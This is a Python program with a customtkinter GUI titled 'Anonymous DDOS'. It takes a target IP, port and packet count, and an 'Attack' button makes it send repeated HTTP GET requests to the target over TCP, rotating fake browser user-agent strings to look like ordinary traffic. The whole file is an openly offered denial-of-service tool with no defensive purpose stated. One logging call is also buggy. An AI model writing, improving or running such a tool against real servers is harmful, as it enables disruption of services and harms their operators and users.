from customtkinter import *
import time
import socket
import threading
import random

def main():
    # List of random user agent strings
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/14.1.1'
        # Add more user agent strings as needed
    ]

    target_ip = ip_i.get()
    target_port = port_i.get()
    num_packets = turbo_i.get()

    if not target_ip:
        log_panel.log('IP Empty')
        return

    if not target_port:
        log_panel.log('Port Empty')
        return

    if not num_packets:
        log_panel.log('Num Packets Empty')
        return

    log_panel.log('Attack Started')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((target_ip, int(target_port)))

        for _ in range(int(num_packets)):
            random_user_agent = random.choice(user_agents)

            message = f'GET / HTTP/1.1\r\nUser-Agent: {random_user_agent}\r\n\r\n'.encode()

            sock.sendall(message)

            # Receive response from the server if necessary
            response = sock.recv(1024)
            log_panel.log('Received:', response.decode('utf-8'))

        log_panel.log(f'Successfully sent {num_packets} TCP packets to {target_ip}:{target_port}')

    except Exception as e:
        log_panel.log(f'Error: {e}')

    finally:
        # Close the socket
        sock.close()

def start_attack():
    threading.Thread(target=main).start()

class LogPanel(CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.log_text = CTkTextbox(self, height=10, width=50, font=('bold', 12))
        self.log_text.pack(side='bottom',expand=True, fill='both')

        self.log_text.configure(state=DISABLED)  # make the text widget read-only
        self.pack(expand=True, fill='both', side='bottom')

    def log(self, message):
        self.log_text.configure(state=NORMAL)  # enable editing
        self.log_text.insert(END, message + '\n')
        self.log_text.configure(state=DISABLED)  # disable editing
        self.log_text.see(END)  # scroll to the end of the text

# Example usage
if __name__ == "__main__":

    window = CTk()
    window.title("Anonymous DDOS")
    window.geometry('300x350')

    # Frames
    mainframe = CTkFrame(window)
    mainframe.pack(side='top', fill='both', expand=True, pady=7, padx=12)

    logframe = CTkFrame(window)
    logframe.pack(side='bottom', fill='both', pady=7, padx=12, expand=True)

    ip_i = CTkEntry(mainframe, placeholder_text='Server IP', font=('Roboto', 16))
    ip_i.pack(pady=7, padx=10)

    port_i = CTkEntry(mainframe, placeholder_text='Server Port(80)', font=('Roboto', 16))
    port_i.pack(pady=7, padx=10)

    turbo_i = CTkEntry(mainframe, placeholder_text='Num Packets', font=('Roboto', 16))
    turbo_i.pack(pady=7, padx=10)

    atackk_btn = CTkButton(mainframe, text='Attack', font=('Roboto', 20), command=start_attack)
    atackk_btn.pack(pady=15, padx=10)

    log_panel = LogPanel(logframe)
    log_panel.pack(pady=15,padx=10,expand=True, fill='both')

    # log_panel.log("This is a log message.")

    window.mainloop()
